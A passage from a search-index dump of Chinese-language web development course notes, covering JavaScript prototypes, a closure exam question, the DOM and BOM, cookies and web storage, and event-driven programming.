Programming\uff1a\u4f20\u7edf\u610f\u4e49\u4e0a\u6ca1\u6709\u663e\u5f0f\u7684 classes (ES6 <code>class</code> syntax \u662f prototypes \u4e4b\u4e0a\u7684 syntactic sugar)\u3002</li> <li>\u884c\u4e3a\u91cd\u7528\uff08inheritance\uff09\u662f\u901a\u8fc7\u5bf9\u8c61\u4ece\u5176 prototype \u5bf9\u8c61\u7ee7\u627f\u5c5e\u6027\u548c\u65b9\u6cd5\u6765\u5b9e\u73b0\u7684\u3002</li> <li>\u5bf9\u8c61\u662f\u901a\u8fc7\u201ccloning\u201d\u6216\u94fe\u63a5\u5230\u73b0\u6709\u5bf9\u8c61\uff08prototypes\uff09\u6765\u521b\u5efa\u7684\u3002</li> <li>\u4e5f\u79f0\u4e3a class-less\u3001prototype-oriented \u6216 instance-based \u7684\u7f16\u7a0b\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#71-prototypes","title":"7.1 \u4f7f\u7528 Prototypes \u91cd\u7528\u51fd\u6570","text":"<p>\u4e3a\u4e86\u907f\u514d\u4e3a\u6bcf\u4e2a\u5bf9\u8c61\u5b9e\u4f8b\u590d\u5236\u51fd\u6570\uff0c\u53ef\u4ee5\u5c06\u65b9\u6cd5\u6dfb\u52a0\u5230\u6784\u9020\u51fd\u6570\u7684 <code>prototype</code> property \u4e2d\u3002</p> <ul> <li>\u4e2d\u7684\u6bcf\u4e2a\u51fd\u6570\u90fd\u81ea\u52a8\u62e5\u6709\u4e00\u4e2a <code>prototype</code> property\uff0c\u5b83\u662f\u4e00\u4e2a\u5bf9\u8c61\u3002</li> </ul> <ul> <li>\u5f53\u51fd\u6570\u4e0e <code>new</code> \u4e00\u8d77\u7528\u4f5c\u6784\u9020\u51fd\u6570\u65f6\uff0c\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u4f1a\u83b7\u5f97\u4e00\u4e2a\u5230\u6784\u9020\u51fd\u6570\u7684 <code>prototype</code> \u5bf9\u8c61\u7684\u5185\u90e8\u94fe\u63a5\uff08\u901a\u5e38\u79f0\u4e3a <code>[[Prototype]]</code> \u6216 <code>__proto__</code>\uff09\u3002</li> </ul> <ul> <li>Prototype Chain\uff1a\u5f53\u4f60\u5c1d\u8bd5\u8bbf\u95ee\u5bf9\u8c61\u4e0a\u7684\u5c5e\u6027\u65f6\uff1a</li> </ul> <ol> <li> <p>\u9996\u5148\u68c0\u67e5\u5bf9\u8c61\u672c\u8eab\u662f\u5426\u76f4\u63a5\u62e5\u6709\u8be5\u5c5e\u6027\u3002</p> </li> <li> <p>\u5982\u679c\u672a\u627e\u5230\uff0c\u5219\u68c0\u67e5\u5bf9\u8c61\u7684 prototype\u3002</p> </li> <li> <p>\u5982\u679c\u4ecd\u672a\u627e\u5230\uff0c\u5219\u68c0\u67e5 prototype \u7684 prototype\uff0c\u4f9d\u6b64\u7c7b\u63a8\uff0c\u5f62\u6210\u4e00\u4e2a\u201cprototype chain\u201d\u3002</p> <p>\u6b64\u94fe\u5c06\u7ee7\u7eed\uff0c\u76f4\u5230\u627e\u5230\u8be5\u5c5e\u6027\u6216\u5230\u8fbe\u94fe\u7684\u672b\u5c3e\uff08\u901a\u5e38\u662f Object.prototype\uff0c\u5176\u81ea\u8eab\u7684 prototype \u4e3a null\uff09\u3002</p> </li> </ol> <ul> <li>\u5411 Prototype \u6dfb\u52a0\u65b9\u6cd5\uff1a</li> </ul> <pre><code>function Drink(basePrice) {\n    this.basePrice = basePrice; // \u5b9e\u4f8b\u7279\u5b9a\u7684\u5c5e\u6027\n}\n// \u5c06 getPrice \u6dfb\u52a0\u5230 Drink.prototype \u4ee5\u4fbf\u6240\u6709 Drink \u5b9e\u4f8b\u5171\u4eab\u5b83\nDrink.prototype.getPrice = function() {\n    let tax = 1.125; // \u793a\u4f8b\u7a0e\u7387\n    return this.basePrice * tax; // 'this' \u5c06\u6b63\u786e\u5f15\u7528\u8c03\u7528 getPrice \u7684\u5b9e\u4f8b\n};\n\nlet amberPearlLatte = new Drink(10);\nlet winterMelonTea = new Drink(11);\nconsole.log(amberPearlLatte.getPrice()); // \u6709\u6548\uff01\u5728 Drink.prototype \u4e0a\u67e5\u627e getPrice\nconsole.log(winterMelonTea.getPrice());  // \u4e5f\u6709\u6548\uff0c\u4f7f\u7528\u76f8\u540c\u7684\u5171\u4eab\u51fd\u6570\n</code></pre> <p>\u73b0\u5728\uff0camberPearlLatte \u548c winterMelonTea \u6ca1\u6709\u81ea\u5df1\u7684 getPrice \u5c5e\u6027\u3002\u5f53\u8c03\u7528 amberPearlLatte.getPrice() \u65f6\uff0c\u4f1a\u6cbf\u7740 prototype chain \u67e5\u627e\u5230 Drink.prototype \u5e76\u5728\u90a3\u91cc\u627e\u5230\u5b83\u3002</p> <p>Object.prototype \u662f\u5927\u591a\u6570 prototype chains \u7684\u6839\u3002</p>"},{"location":"cs/mern/3403/l5/#72-prototypes","title":"7.2 \u8fd0\u884c\u65f6\u5411 Prototypes \u6dfb\u52a0\u65b9\u6cd5","text":"<p>Banana Skin / \u5f3a\u5927\u529f\u80fd\uff1aPrototypes \u53ef\u4ee5\u5728\u7a0b\u5e8f\u6267\u884c\u671f\u95f4\u7684 \u4efb\u4f55\u65f6\u5019 \u8fdb\u884c\u4fee\u6539\u3002\u8fd9\u610f\u5473\u7740\u4f60\u53ef\u4ee5\u5411 prototype \u6dfb\u52a0\u65b0\u65b9\u6cd5\uff0c\u6240\u6709\u4ece\u8be5 prototype \u7ee7\u627f\u7684\u73b0\u6709\u5bf9\u8c61\uff08\u4ee5\u53ca\u5c06\u6765\u7684\u5bf9\u8c61\uff09\u90fd\u5c06\u7acb\u5373\u83b7\u5f97\u5bf9\u8fd9\u4e9b\u65b0\u65b9\u6cd5\u7684\u8bbf\u95ee\u6743\u9650\u3002</p> <ul> <li>\u793a\u4f8b\uff1a\u5411 <code>String.prototype</code> \u6dfb\u52a0 <code>reversed</code> \u65b9\u6cd5\uff1a</li> </ul> <pre><code>const s = \"live on\"; // \u4e00\u4e2a\u73b0\u6709\u7684\u5b57\u7b26\u4e32\u5b9e\u4f8b\n// \u5411\u6240\u6709\u5b57\u7b26\u4e32\u7684 prototype \u6dfb\u52a0\u4e00\u4e2a\u65b0\u65b9\u6cd5\nString.prototype.reversed = function() {\n    let r = \"\";\n    for (var i = this.length - 1; i &gt;= 0; i--) {\n        r += this[i];\n    }\n    return r;\n};\nconsole.log(s.reversed()); // \u8f93\u51fa: \"no evil\"\n                           // 's' \u73b0\u5728\u53ef\u4ee5\u4f7f\u7528 'reversed'\uff0c\u5373\u4f7f\u5b83\u662f\u5728 'reversed' \u88ab\u6dfb\u52a0\u5230 prototype \u4e4b\u524d\u521b\u5efa\u7684\u3002\n                           // \u67e5\u627e\u662f\u5728\u8fd0\u884c\u65f6\u8fdb\u884c\u7684\u3002\nconsole.log(\"another string\".reversed()); // \u4e5f\u6709\u6548\n</code></pre> <ul> <li>Inheritance\uff1aPrototypes \u662f\u4e2d\u5b9e\u73b0\u7ee7\u627f\u7684\u673a\u5236\u3002\u201csubclass\u201d\uff08\u6784\u9020\u51fd\u6570\uff09\u53ef\u4ee5\u5c06\u5176 prototype \u8bbe\u7f6e\u4e3a\u201csuperclass\u201d\u6784\u9020\u51fd\u6570\u7684\u5b9e\u4f8b\uff0c\u6216\u8005\u66f4\u5e38\u89c1\u7684\u662f\uff0c\u4f7f\u7528 <code>Object.create()</code> \u6765\u94fe\u63a5 prototypes\u3002</li> </ul> <p>\u672c\u6307\u5357\u7684\u4e0b\u4e00\u90e8\u5206\u5c06\u7ee7\u7eed\u4ecb\u7ecd Variable Scoping \u548c Closures\u3002</p>"},{"location":"cs/mern/3403/l5_ex/","title":"5.1 Exam QAs","text":""},{"location":"cs/mern/3403/l5_ex/#exam-review","title":"Exam Review","text":""},{"location":"cs/mern/3403/l5_ex/#2024-mock-exam-q4","title":"2024 Mock Exam Q4","text":"<pre><code>function foo(n) {\n    let x = 0;\n    for (var i = 1; i &lt; arguments.length; i++) {\n        if (arguments[i] &gt;= n) {\n            x += 1;\n        }\n    }\n    return (y) =&gt; \"It's \" + \"bu\".repeat(x + y) + \"bble tea!\";\n}\n\nlet f = foo(0);\nalert(f);          // Message A: \u8f93\u51fa\u7bad\u5934\u51fd\u6570\u4ee3\u7801\nalert(f(1));       // Message B: It's bubble tea!\n\nlet g = foo(2, 1, 0, 1);\nalert(g(0));       // Message C: It's bble tea!\n\nlet h = foo(2, 1, 3, 3, 1);\nalert(h(1));       // Message D: It's bubububble tea!\nalert(h(0, 2));    // Message E: It's bububble tea!\n</code></pre> <ul> <li>2024 \u5e74 Exam \u7b2c\u56db\u9898\u8003\u9898\uff0c\u4e94\u4e2a\u6253\u5370\u51fa\u6765\u7684\u5185\u5bb9\u662f\u5565</li> </ul> <p><code>foo(0)</code> \u4f1a\u8fd4\u56de\u4e00\u4e2a\u533f\u540d\u51fd\u6570 <code>\"It's \" + \"bu\".repeat(x + y) + \"bble tea!\";</code></p> <p>\u4f46\u662f\u5e76\u6ca1\u6709\u6253\u5370\u51fa\u6765\u800c\u662f\u7528 <code>alret</code>\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u76f4\u63a5\u628a\u62ec\u53f7\u91cc\u6240\u6709\u4e1c\u897f\u76f4\u63a5\u641e\u51fa\u6765</p> <pre><code>(y) =&gt; \"It's \" + \"bu\".repeat(x+y) + \"bble tea!\" // Message A\nf(1) // \u8fd9\u91cc\u7b49\u4e8e\u5728\u8bf4 y = 1\uff0c\u800c\u7531\u4e8e x = 0 // Message B: It's bubble tea!\nfoo(2, 1, 0, 1) // \u8fd9\u91cc arguments \u957f\u5ea6\u4e3a 4\uff0cn \u4e3a 2, \u7531\u4e8e x \u548c y \u90fd\u662f 0 \u56e0\u6b64 // Message C: It's bble tea!\nfoo(2, 1, 3, 3, 1); // \u6709\u4e24\u4e2a\u4e09\uff0cx = 2, y =1 // Message D: It's bubububble tea!\nh(0, 2) // x = 2, y = 0 \u6240\u4ee5 // Message E: It's bububble tea!\n</code></pre>"},{"location":"cs/mern/3403/l5_ex/#lo","title":"LO","text":"<ul> <li>Purpose of JavaScript</li> </ul> <p>\u589e\u5f3a HTML \u548c CSS\uff0c\u4e3a\u7f51\u7ad9\u6dfb\u52a0\u4ea4\u4e92\u6027\u548c\u52a8\u6001\u529f\u80fd\u3002\u5b83\u5141\u8bb8\u5f00\u53d1\u8005\u521b\u5efa\u66f4\u52a0\u4e30\u5bcc\u548c\u54cd\u5e94\u8fc5\u901f\u7684\u7528\u6237\u4f53\u9a8c\u3002</p> <ul> <li>How JavaScript can be used in the browser</li> </ul> <p>\u64cd\u4f5c HTML \u5185\u5bb9\u548c\u7ed3\u6784 (DOM \u64cd\u4f5c)\uff1a\u52a8\u6001\u5730\u6dfb\u52a0\u3001\u5220\u9664\u6216\u4fee\u6539\u9875\u9762\u7684\u5143\u7d20\u548c\u5185\u5bb9\u3002</p> <p>\u54cd\u5e94\u7528\u6237\u4e8b\u4ef6\uff1a\u4f8b\u5982\u70b9\u51fb\u9f20\u6807\u3001\u6309\u4e0b\u952e\u76d8\u3001\u8868\u5355\u63d0\u4ea4\u7b49\u3002</p> <p>\u6570\u636e\u9a8c\u8bc1\uff1a\u5728\u6570\u636e\u53d1\u9001\u5230\u670d\u52a1\u5668\u4e4b\u524d\uff0c\u5728\u5ba2\u6237\u7aef\u9a8c\u8bc1\u7528\u6237\u8f93\u5165\u3002</p> <p>\u5f02\u6b65\u901a\u4fe1 (AJAX)\uff1a\u5728\u4e0d\u91cd\u65b0\u52a0\u8f7d\u6574\u4e2a\u9875\u9762\u7684\u60c5\u51b5\u4e0b\u4e0e\u670d\u52a1\u5668\u4ea4\u6362\u6570\u636e\u3002</p> <p>\u521b\u5efa\u52a8\u753b\u548c\u89c6\u89c9\u6548\u679c\u3002</p> <p>\u5b58\u50a8\u548c\u68c0\u7d22\u6d4f\u89c8\u5668\u4e2d\u7684\u4fe1\u606f (Cookies, Local Storage)\u3002</p> <ul> <li>All of the language features covered in the lecture.</li> </ul> <p>\u53d8\u91cf (Variables)\uff1a\u7528\u4e8e\u5b58\u50a8\u6570\u636e (\u4f8b\u5982 <code>let</code>, <code>const</code>, <code>var</code>)\u3002</p> <p>\u6570\u636e\u7c7b\u578b (Data Types)\uff1a\u4f8b\u5982\u5b57\u7b26\u4e32 (Strings)\u3001\u6570\u5b57 (Numbers)\u3001\u5e03\u5c14\u503c (Booleans)\u3001\u6570\u7ec4 (Arrays)\u3001\u5bf9\u8c61 (Objects)\u3002</p> <p>\u8fd0\u7b97\u7b26 (Operators)\uff1a\u7b97\u672f\u8fd0\u7b97\u7b26\u3001\u6bd4\u8f83\u8fd0\u7b97\u7b26\u3001\u903b\u8f91\u8fd0\u7b97\u7b26\u7b49\u3002</p> <p>\u63a7\u5236\u6d41\u8bed\u53e5 (Control Flow)\uff1a</p> <ul> <li>\u6761\u4ef6\u8bed\u53e5 (Conditional Statements)\uff1a<code>if...else</code>\uff0c<code>switch</code>\u3002</li> <li>\u5faa\u73af\u8bed\u53e5 (Loops)\uff1a<code>for</code>\uff0c<code>while</code>\uff0c<code>do...while</code>\u3002</li> </ul> <p>\u51fd\u6570 (Functions)\uff1a\u7528\u4e8e\u5c01\u88c5\u53ef\u91cd\u7528\u7684\u4ee3\u7801\u5757\u3002</p> <p>\u4f5c\u7528\u57df (Scope)\uff1a\u53d8\u91cf\u7684\u53ef\u8bbf\u95ee\u6027\u3002</p> <p>\u4e8b\u4ef6\u5904\u7406 (Event Handling)\uff1a\u54cd\u5e94\u7528\u6237\u4ea4\u4e92\u3002</p> <p>DOM \u64cd\u4f5c\u57fa\u7840 (Basic DOM Manipulation)\uff1a\u9009\u62e9\u548c\u4fee\u6539 HTML \u5143\u7d20\u3002</p>"},{"location":"cs/mern/3403/l6/","title":"6.0 Client Javascript","text":""},{"location":"cs/mern/3403/l6/#1-the-purpose-and-overall-structure-of-the-dom-but-not-the-keywords","title":"1. The purpose and overall structure of the DOM (but not the keywords)","text":"<p>Purpose (\u76ee\u7684): DOM \u662f\u4e00\u4e2a\u81f3\u5173\u91cd\u8981\u7684\u754c\u9762\uff0c\u5b83\u5141\u8bb8\u811a\u672c (\u5982 JavaScript) \u52a8\u6001\u8bbf\u95ee\u548c\u64cd\u4f5c HTML \u6587\u6863\u7684 content (\u5185\u5bb9)\u3001structure (\u7ed3\u6784) \u548c style (\u6837\u5f0f)\u3002\u8fd9\u79cd\u80fd\u529b\u4f7f\u5f97\u521b\u5efa\u52a8\u6001\u7f51\u9875\u548c\u4fc3\u8fdb\u5ba2\u6237\u7aef\u7f16\u7a0b\u6210\u4e3a\u53ef\u80fd\u3002 \u5b83\u5145\u5f53 HTML \u6587\u6863\u548c\u7f16\u7a0b\u8bed\u8a00\u4e4b\u95f4\u7684 API (Application Programming Interface)\u3002 \u901a\u8fc7 DOM\uff0c\u53ef\u4ee5\u5904\u7406\u6587\u6863\uff0c\u5e76\u4e14\u6b64\u5904\u7406\u4ea7\u751f\u7684\u4efb\u4f55\u66f4\u6539\u90fd\u53ef\u4ee5\u53cd\u6620\u5728\u5448\u73b0\u7684\u7f51\u9875\u4e2d\u3002</p> <p>Overall Structure (\u603b\u4f53\u7ed3\u6784): DOM \u5c06 HTML \u6587\u6863\u8868\u793a\u4e3a\u4e00\u4e2a\u5bf9\u8c61\u7684\u6811\u5f62\u7ed3\u6784 (tree structure)\u3002 \u6b64\u6811\u7684\u6839\u901a\u5e38\u662f Document object (\u6587\u6863\u5bf9\u8c61)\uff0c\u7136\u540e\u5206\u652f\u5230\u8bf8\u5982 <code>&lt;html&gt;</code>\u3001<code>&lt;head&gt;</code> \u548c <code>&lt;body&gt;</code> \u4e4b\u7c7b\u7684\u5143\u7d20\uff0c\u53cd\u6620\u4e86 HTML \u6587\u6863\u7684\u5c42\u6b21\u7ed3\u6784\u3002 HTML \u6587\u6863\u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\u90fd\u5bf9\u5e94\u4e8e\u6b64\u6811\u4e2d\u7684\u4e00\u4e2a\u201celement object (\u5143\u7d20\u5bf9\u8c61)\u201d\u3002 HTML \u5143\u7d20\u7684 attributes (\u5c5e\u6027) (\u4f8b\u5982 <code>id</code>\u3001<code>class</code>\u3001<code>src</code>) \u6210\u4e3a\u8fd9\u4e9b JavaScript \u5143\u7d20\u5bf9\u8c61\u7684\u547d\u540d\u5c5e\u6027\u3002</p>"},{"location":"cs/mern/3403/l6/#2-the-purpose-and-overall-structure-of-the-bom","title":"2. The purpose and overall structure of the BOM","text":"<p>Purpose (\u76ee\u7684): BOM \u5141\u8bb8 JavaScript \u4e0e\u6d4f\u89c8\u5668\u672c\u8eab\u8fdb\u884c\u4ea4\u4e92\uff0c\u8d85\u8d8a\u5f53\u524d HTML \u6587\u6863\u7684\u5185\u5bb9\u3002 \u5b83\u63d0\u4f9b\u4e86\u5bf9\u975e\u5f53\u524d\u6e32\u67d3\u9875\u9762\u7279\u5b9a\u7684\u6d4f\u89c8\u5668\u529f\u80fd\u548c\u4fe1\u606f\u7684\u8bbf\u95ee\u3002 \u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528 BOM \u6839\u636e\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u4e0a\u4e0b\u6587\u548c\u529f\u80fd\u5b9a\u5236 Web \u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>Overall Structure (\u603b\u4f53\u7ed3\u6784): DOM \u88ab\u8ba4\u4e3a\u662f\u66f4\u5927\u7684 BOM \u7684\u4e00\u90e8\u5206\u3002 BOM \u4e2d\u7684\u6838\u5fc3\u5bf9\u8c61\u662f window object (\u7a97\u53e3\u5bf9\u8c61)\uff0c\u5b83\u4ee3\u8868\u6d4f\u89c8\u5668\u7a97\u53e3\u6216\u6807\u7b7e\u9875\u3002 BOM \u5305\u62ec\u4e0e\u4ee5\u4e0b\u76f8\u5173\u7684\u5bf9\u8c61\u548c\u5c5e\u6027\uff1a</p> <ul> <li>\u6b63\u5728\u4f7f\u7528\u7684\u6d4f\u89c8\u5668\u7c7b\u578b\u3002</li> <li>\u7528\u6237\u7684\u6d4f\u89c8\u5386\u53f2 (\u4f8b\u5982 <code>window.history</code>)\u3002</li> <li>\u6d4f\u89c8\u5668\u5b58\u50a8\u7684 Cookies\u3002</li> <li>\u5c4f\u5e55\u5c3a\u5bf8\u548c\u663e\u793a\u4fe1\u606f (\u4f8b\u5982 <code>window.screen</code>)\u3002</li> <li>Geolocation (\u5730\u7406\u4f4d\u7f6e) \u6570\u636e (\u9700\u7528\u6237\u8bb8\u53ef)\u3002</li> <li>\u672c\u5730\u6d4f\u89c8\u5668\u5b58\u50a8\u3002</li> <li>\u5f53\u524d URL (\u4f8b\u5982 <code>window.location</code>)\u3002</li> <li>\u5173\u4e8e\u6d4f\u89c8\u5668\u5e94\u7528\u7a0b\u5e8f\u672c\u8eab\u7684\u4fe1\u606f (\u4f8b\u5982 <code>window.navigator</code>)\u3002 \u4e0e DOM \u4e0d\u540c\uff0cBOM \u4e0d\u53d7\u4e25\u683c\u6807\u51c6\u7684\u7ea6\u675f\uff0c\u4f46\u5927\u591a\u6570\u6d4f\u89c8\u5668\u90fd\u652f\u6301\u4e00\u7ec4\u901a\u7528\u529f\u80fd\u3002</li> </ul>"},{"location":"cs/mern/3403/l6/#3-the-different-ways-that-the-dom-may-be-used-to-edit-the-page","title":"3. The different ways that the DOM may be used to edit the page","text":"<p>(\u8003\u8bd5\u4e0d\u8981\u6c42\u8bb0\u4f4f\u5177\u4f53\u7684\u5173\u952e\u8bcd)</p> <p>Dynamic Content and Structure Updates: DOM \u5141\u8bb8\u811a\u672c\u5728\u7f51\u9875\u52a0\u8f7d\u540e\u52a8\u6001\u66f4\u6539\u5176\u5185\u5bb9\u3001\u7ed3\u6784\u548c\u6837\u5f0f\u3002</p> <p>Accessing Elements (\u8bbf\u95ee\u5143\u7d20):</p> <ul> <li>\u53ef\u4ee5\u6839\u636e\u5143\u7d20\u7684\u6807\u7b7e\u7c7b\u578b\u53ca\u5176\u5728\u96c6\u5408\u4e2d\u7684\u4f4d\u7f6e (\u4f8b\u5982\uff0c\u7b2c\u4e00\u4e2a\u56fe\u50cf) \u6765\u67e5\u627e\u5143\u7d20\u3002</li> <li>\u5982\u679c\u5143\u7d20\u5177\u6709 <code>name</code> \u5c5e\u6027 (\u901a\u5e38\u5728\u8868\u5355\u4e2d)\uff0c\u5219\u53ef\u4ee5\u8bbf\u95ee\u5b83\u4eec\u3002</li> <li>\u4e00\u79cd\u5e38\u89c1\u7684\u65b9\u6cd5\u662f\u901a\u8fc7\u5176\u552f\u4e00\u7684 <code>id</code> \u5c5e\u6027\u8bbf\u95ee\u5143\u7d20\u3002</li> <li>\u67d0\u4e9b\u5143\u7d20\uff0c\u5982\u590d\u9009\u6846\u6216\u5355\u9009\u6309\u94ae\uff0c\u53ef\u80fd\u6709\u7279\u5b9a\u7684\u8bbf\u95ee\u65b9\u5f0f\uff0c\u901a\u5e38\u4f5c\u4e3a\u7ec4\u6216\u6570\u7ec4\u7684\u4e00\u90e8\u5206\u3002</li> </ul> <p>Traversing the DOM Tree (\u904d\u5386 DOM \u6811): \u4e00\u65e6\u8bbf\u95ee\u4e86\u67d0\u4e2a\u5143\u7d20\uff0c\u811a\u672c\u5c31\u53ef\u4ee5\u5bfc\u822a\u5230\u5176\u76f8\u5173\u5143\u7d20\uff0c\u4f8b\u5982\u5176\u7236\u5143\u7d20\u3001\u5b50\u5143\u7d20\u6216\u5144\u5f1f\u5143\u7d20\u3002\u8fd9\u5141\u8bb8\u4ee5\u7f16\u7a0b\u65b9\u5f0f\u63a2\u7d22\u9875\u9762\u7ed3\u6784\uff0c\u5373\u4f7f\u4e8b\u5148\u4e0d\u77e5\u9053\u786e\u5207\u7684\u5e03\u5c40\u3002</p> <p>Modifying the DOM Tree (\u4fee\u6539 DOM \u6811):</p> <ul> <li>\u53ef\u4ee5\u521b\u5efa\u65b0\u5143\u7d20\u5e76\u5c06\u5176\u63d2\u5165\u5230\u6587\u6863\u4e2d\u3002</li> <li>\u53ef\u4ee5\u79fb\u52a8\u3001\u66ff\u6362\u6216\u4ece\u6587\u6863\u4e2d\u5220\u9664\u73b0\u6709\u5143\u7d20\u3002</li> <li>\u8fd9\u610f\u5473\u7740\u53ef\u4ee5\u4f7f\u7528 JavaScript \u52a8\u6001\u6784\u5efa\u6574\u4e2a\u90e8\u5206\u751a\u81f3\u6574\u4e2a\u6587\u6863\u3002</li> <li>\u8fd8\u6709\u4e00\u4e9b\u76f4\u63a5\u7684\u6587\u6863\u5199\u5165\u65b9\u6cd5\u53ef\u7528\u4e8e\u5c06 HTML \u5185\u5bb9\u8f93\u51fa\u5230\u6587\u6863\u6d41\u4e2d\u3002\u73b0\u4ee3\u524d\u7aef\u6846\u67b6\u5728\u5f88\u5927\u7a0b\u5ea6\u4e0a\u4f9d\u8d56\u8fd9\u4e9b\u529f\u80fd\u6765\u52a8\u6001\u6784\u5efa\u7528\u6237\u754c\u9762\u3002</li> </ul>"},{"location":"cs/mern/3403/l6/#4-web-storage-cookies","title":"4. Web Storage \u548c Cookies","text":"<p>Purpose (\u76ee\u7684): HTTP \u662f\u4e00\u79cd\u65e0\u72b6\u6001\u534f\u8bae (stateless protocol)\uff0c\u610f\u5473\u7740\u6bcf\u4e2a\u8bf7\u6c42\u90fd\u662f\u72ec\u7acb\u7684\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8bf7\u6c42\u4e4b\u95f4\u4e0d\u4fdd\u7559\u4efb\u4f55\u4fe1\u606f\u3002Web storage \u548c cookies \u662f\u5728\u5ba2\u6237\u7aef\u5b58\u50a8\u6570\u636e\u7684\u673a\u5236\uff0c\u5141\u8bb8 Web \u5e94\u7528\u7a0b\u5e8f\u8bb0\u4f4f\u6709\u5173\u7528\u6237\u6216\u5176\u4f1a\u8bdd\u7684\u4fe1\u606f\u3002</p> <p>Cookies:</p> <ul> <li>Cookie \u662f\u6d4f\u89c8\u5668\u5b58\u50a8\u7684\u4e00\u4e2a\u5c0f\u6570\u636e\u7247\u6bb5 (\u6700\u5927 4KB)\uff0c\u901a\u5e38\u5305\u542b\u952e\u503c\u5bf9\u7684\u6587\u672c\u6587\u4ef6\u3002</li> <li>\u5f53\u524d\u7f51\u9875\u7684 Cookies \u53ef\u901a\u8fc7 JavaScript \u4e2d\u7684 <code>document.cookie</code> \u8bbf\u95ee\u3002</li> <li>\u5b83\u4eec\u4f1a\u968f\u6bcf\u4e2a\u540e\u7eed\u5230\u8be5\u57df\u7684 HTTP \u8bf7\u6c42\u4e00\u8d77\u53d1\u9001\u56de\u670d\u52a1\u5668\u3002</li> <li>Cookies \u53ef\u4ee5\u6709\u8fc7\u671f\u65e5\u671f\uff0c\u8fc7\u671f\u540e\u5c06\u88ab\u5220\u9664\uff1b\u5982\u679c\u672a\u8bbe\u7f6e\u65e5\u671f\uff0c\u5b83\u4eec\u901a\u5e38\u662f\u4f1a\u8bdd cookies\uff0c\u5e76\u5728\u6d4f\u89c8\u5668\u5173\u95ed\u65f6\u5220\u9664\u3002</li> <li>\u51fa\u4e8e\u5b89\u5168\u539f\u56e0\uff0cCookies\u4ec5\u9650\u4e8e\u521b\u5efa\u5b83\u4eec\u7684\u57df\u3002</li> </ul> <p>Web Storage (Local Storage and Session Storage):</p> <ul> <li>Web Storage \u4e3a\u5ba2\u6237\u7aef\u5b58\u50a8\u63d0\u4f9b\u4e86\u4e00\u79cd\u6bd4 cookies \u66f4\u73b0\u4ee3\u3001\u66f4\u5927 (\u4f8b\u5982 5-10MB) \u4e14\u901a\u5e38\u66f4\u5b89\u5168\u7684\u66ff\u4ee3\u65b9\u6848\u3002</li> <li>\u5b83\u63d0\u4f9b\u4e86\u4e00\u4e2a\u952e\u503c\u5b57\u5178\uff0c\u5176\u4e2d\u503c\u5b58\u50a8\u4e3a\u5b57\u7b26\u4e32\u3002\u6240\u6709\u503c\u90fd\u4f1a\u81ea\u52a8\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u3002</li> <li>Local Storage: \u5373\u4f7f\u5728\u6d4f\u89c8\u5668\u7a97\u53e3\u5173\u95ed\u5e76\u91cd\u65b0\u6253\u5f00\u540e\uff0c\u6570\u636e\u4ecd\u7136\u5b58\u5728\u3002\u5b83\u5bf9\u4e8e\u5b58\u50a8\u7528\u6237\u504f\u597d\u6216\u9700\u8981\u6301\u7eed\u8d85\u51fa\u5355\u4e2a\u4f1a\u8bdd\u7684\u5e94\u7528\u7a0b\u5e8f\u72b6\u6001\u975e\u5e38\u6709\u7528\u3002</li> <li>Session Storage: \u4ec5\u5728\u5f53\u524d\u6d4f\u89c8\u5668\u4f1a\u8bdd\u671f\u95f4 (\u5373\uff0c\u5f53\u6807\u7b7e\u9875\u6216\u7a97\u53e3\u6253\u5f00\u65f6) \u5b58\u50a8\u6570\u636e\u3002\u4f1a\u8bdd\u7ed3\u675f\u65f6\u6570\u636e\u5c06\u88ab\u6e05\u9664\u3002</li> <li>\u4e0e cookies \u4e0d\u540c\uff0cweb storage \u6570\u636e\u4e0d\u4f1a\u968f\u6bcf\u4e2a HTTP \u8bf7\u6c42\u81ea\u52a8\u4f20\u8f93\uff1b\u5b83\u4e3b\u8981\u4f9b\u5ba2\u6237\u7aef\u4f7f\u7528\u3002</li> <li>Web storage \u4e5f\u53d7\u540c\u6e90\u7b56\u7565\u9650\u5236\u3002</li> </ul>"},{"location":"cs/mern/3403/l6/#5-event-driven-programming","title":"5. \u4e8b\u4ef6\u9a71\u52a8\u7f16\u7a0b (Event-Driven Programming) \u7684\u76ee\u7684\u548c\u7ed3\u6784","text":"<p>Purpose (\u76ee\u7684): Event-driven programming (\u4e8b\u4ef6\u9a71\u52a8\u7f16\u7a0b) \u662f\u4e00\u79cd\u7f16\u7a0b\u8303\u5f0f\uff0c\u5176\u4e2d\u7a0b\u5e8f\u6267\u884c\u7684\u6d41\u7a0b\u7531\u4e8b\u4ef6\u51b3\u5b9a\u3002\u8fd9\u4e9b\u4e8b\u4ef6\u53ef\u4ee5\u662f\u7528\u6237\u64cd\u4f5c (\u5982\u9f20\u6807\u70b9\u51fb\u6216\u6309\u952e)\u3001\u4f20\u611f\u5668\u8f93\u51fa\u6216\u6765\u81ea\u5176\u4ed6\u7a0b\u5e8f\u6216\u7cfb\u7edf\u90e8\u5206\u7684\u6d88\u606f\u3002 \u5b83\u662f Web \u5f00\u53d1\u4e2d\u7684\u4e00\u4e2a\u57fa\u672c\u6982\u5ff5\uff0c\u5c24\u5176\u662f\u5728\u5ba2\u6237\u7aef\uff0c\u7528\u6237\u4ea4\u4e92\u51b3\u5b9a\u4e86\u5e94\u7528\u7a0b\u5e8f\u7684\u884c\u4e3a\u3002\u5b83\u652f\u6491\u7740\u50cf AJAX \u548c JavaScript \u56de\u8c03\u8fd9\u6837\u7684\u6280\u672f\u3002</p> <p>Structure (\u7ed3\u6784): \u901a\u5e38\uff0c\u4e00\u4e2a\u4e8b\u4ef6\u9a71\u52a8\u7a0b\u5e8f\u5305\u542b\u4e00\u4e2a event loop (\u4e8b\u4ef6\u5faa\u73af)\uff0c\u5b83\u6301\u7eed\u7b49\u5f85\u4e8b\u4ef6\u53d1\u751f\u3002 \u5f53\u68c0\u6d4b\u5230\u4e8b\u4ef6 (event detection) \u65f6\uff0c\u4f1a\u6267\u884c\u4e00\u6bb5\u76f8\u5e94\u7684\u4ee3\u7801\uff0c\u79f0\u4e3a event handler (\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f) \u6216 event listener 